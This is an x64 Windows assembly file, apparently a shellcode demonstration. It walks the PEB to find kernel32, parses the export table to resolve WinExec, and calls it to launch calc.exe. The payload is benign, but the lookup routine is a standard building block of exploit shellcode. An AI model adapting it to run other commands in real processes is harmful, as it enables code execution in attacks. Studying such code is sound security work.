[bits 64]
section .text:
    global _start
    
_start:

push rbp
mov rbp, rsp
sub rsp, 40h
xor rax, rax
mov [rbp - 08h], rax    ; Number_of_Exported_Functions
mov [rbp - 10h], rax    ; Adress_Table
mov [rbp - 18h], rax    ; Name_Ptr_Table
mov [rbp - 20h], rax    ; Ordinal_Table
mov [rbp - 28h], rax    ; Pointer(WinExec-String)
mov [rbp - 30h], rax	; Address(WinExec-Function)
mov [rbp - 38h], rax	; reserved
push rax
mov rax, 0x00636578456E6957  ; 0x00 + c,e,x,E,n,i,W
push rax				     ; push WinExec\n to stack
mov [rbp - 28h], rsp         ; Pointer(WinExec-String) -> Var

xor rax, rax
mov rax, gs:[0x60]
mov rax, [rax + 0x18]    ; PEB + 18 Bytes -> Pointer(Ldr)
mov rax, [rax + 0x20]    ; Ldr + 20 Bytes -> Pointer(InMemoryModuleList)
mov rax, [rax]           ; InMemoryModuleList -> ProcessModule
mov rax, [rax]           ; InMemoryModuleList -> ntdll Module
mov rax, [rax + 0x20]    ; InMemoryModuleList -> kernel32 + 20 Bytes DllBase
mov rbx, rax             ; Save kernerl32.base to rbx

mov eax, [rbx + 0x3c]    ; Pointer(RVA_PE_Signature)
add rax, rbx             ; rax = kernel32.base + RVA_PE_Signature
mov eax, [rax + 0x88]    ; Pointer(RVA_Export_Table)
add rax, rbx             ; rax = kernel32.base + RVA_Export_Table

xor rcx, rcx
mov ecx, [rax + 0x14]    ; Number_of_Exported_Functions
mov [rbp - 8h], rcx      ; Number_of_Exported_Functions -> Var
mov ecx, [rax + 0x1c]    ; RVA_Address_Table
add rcx, rbx             ; Adress_Table = kernel32.base + RVA_Address_Table
mov [rbp - 10h], rcx     ; Adress_Table -> Var
mov ecx, [rax + 0x20]    ; RVA_Name_Ptr_Table
add rcx, rbx             ; Name_Ptr_Table = kernel32.base + RVA_Name_Ptr_Table
mov [rbp - 18h], rcx     ; Name_Ptr_Table -> Var
mov ecx, [rax + 0x24]    ; RVA_Ordinal_Table
add rcx, rbx             ; Ordinal_Table = kernel32.base + RVA_Ordinal_Table
mov [rbp - 20h], rcx     ; Ordinal_Table -> Var

xor rax, rax
xor rcx, rcx
			
findWinExecPosition:
	mov rsi, [rbp - 28h]	  ; Pointer(WinExec-String)
	mov rdi, [rbp - 18h]	  ; Pointer(Name_Ptr_Table)
	cld						  ; clear direction, low -> high Adresses
	mov edi, [rdi + rax * 4]  ; RVA_Next_Function from Name_Ptr_Table
	add rdi, rbx	          ; Adress_Next_Function
	mov cl, 8	          ; compare first 8 Bytes
	repe cmpsb		  ; check if rsi == rdi		
	jz WinExecFound           ; if found -> jump
	inc rax		          ; else: increase the counter
	cmp rax, [rbp - 8h]	  ; counter = Number_of_Exported_Functions
	jne findWinExecPosition   ; if not -> jump

WinExecFound:		
	mov rcx, [rbp - 20h]		; Ordinal_Table
	mov rdx, [rbp - 10h]		; Adress_Table
	mov ax, [rcx + rax * 2]		; Ordinal_WinExec
	mov eax, [rdx + rax * 4]        ; RVA_WinExec
	add rax, rbx			; VA_WinExec
	jmp short InvokeWinExec

InvokeWinExec:
  xor rdx, rdx
  xor rcx, rcx				     
  push rcx					 
  mov rcx, 0x6578652e636c6163    ; exe.clac
  push rcx
  mov rcx, rsp			         ; rcx = calc.exe
  mov dl, 0x1			         ; uCmdSHow = SW_SHOWDEFAULT
  and rsp, -16			         ; 16-byte Stack Alignment
  sub rsp, 32			         ; STACK + 32 Bytes (shadow spaces)
  call rax 			         ; call WinExec

; clear stack
add rsp, 38h				; local variables				
add rsp, 18h				; pushes for ebp and WinExec
add rsp, 8h				; pushes for WinExec invokation
pop rbp
ret